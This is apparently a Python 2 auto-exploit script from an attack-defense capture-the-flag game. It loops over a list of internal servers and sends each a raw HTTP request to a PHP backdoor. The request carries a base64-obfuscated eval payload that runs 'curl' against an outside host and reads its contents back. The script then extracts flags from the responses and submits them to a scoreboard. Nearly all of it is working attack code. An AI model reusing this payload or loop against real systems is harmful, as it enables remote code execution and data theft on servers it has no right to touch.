#!/usr/bin/python

import socket, time, requests

httpServers = ['172.16.0.48', '172.16.0.49', '172.16.0.50', '172.16.0.51', '172.16.0.52', '172.16.0.53', '172.16.0.54', '172.16.0.55', '172.16.0.56', '172.16.0.57', '172.16.0.58', '172.16.0.63', '172.16.0.64', '172.16.0.66', '172.16.0.67', '172.16.0.68', '172.16.0.69', '172.16.0.71', '172.16.0.72', '172.16.0.73', '172.16.0.74', '172.16.0.75', '172.16.0.77', '172.16.0.86', '172.16.0.99', '172.16.0.141',  '172.16.0.161', '172.16.0.203', '172.16.0.229', '172.16.0.254']



def submit(i):
    i=i.replace("\n","").replace('{','%7b').replace('}','%7d')
    print "recv: %s" % i

    payload = '''POST /index.php/wargame/submit HTTP/1.1
Host: 172.16.0.77
Connection: keep-alive
Content-Length: ''' + str(len(i)+4) +'''
Pragma: no-cache
Cache-Control: no-cache
Origin: http://172.16.0.77
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-FirePHP-Version: 0.0.6
Referer: http://172.16.0.77/index.php/wargame
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: PHPSESSID=tgc0fq4fsvv2jgs3rteq6eni23; xdgame_username=%2a%2a%2a%2a%2a%2a

key=''' + i

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("172.16.0.77", 80))
    s.send(payload)
    a=s.recv(1000000)
    print a.find('Content-Length: 1162')
    s.close()
    
payload = '''POST /pay/smilent.php HTTP/1.1
Host: 172.16.0.47:80
X-Forwarded-For: 0.0.0.0
Cookie: KceCkYpR34b98b87d11653f2da=1%3Beval%28base64_decode%28c3lzdGVtKCJjdXJsIDE5Mi4xNjguNS4xMDo4MDAiKTs%29%29;
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept: */*
User-Agent: python-requests/2.3.0 CPython/2.7.8 Darwin/15.0.0
Content-Length: 53

x=print+file_get_contents("http://192.168.5.10:800");'''


while True:
    for i in httpServers:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((i, 80))
        except:
            print "%s failed" % i
            continue
        print "%s connected" % i
        s.send(payload)
        try:
            a=s.recv(1000000)
        except:
            continue
        if a.find('XDSEC')!=-1:
            try:
                a=a.split("\r\n\r\n")[1].split('}')[0] + '}'
            except:
                print "err: %s" % a
                continue
            print "submitting: %s" % a
            submit(a)
        s.close()
    print time.asctime()
    time.sleep(60)
    print time.asctime()

